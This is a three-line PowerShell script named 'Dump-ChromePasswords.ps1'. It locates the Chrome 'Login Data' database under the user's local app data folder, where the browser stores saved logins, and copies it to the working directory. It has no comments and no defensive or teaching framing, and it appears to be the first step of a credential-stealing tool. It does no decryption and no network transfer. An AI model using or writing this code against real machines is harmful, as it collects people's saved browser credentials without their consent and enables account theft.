# Dump-ChromePasswords.ps1
$Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
Copy-Item $Path .\loginData.db
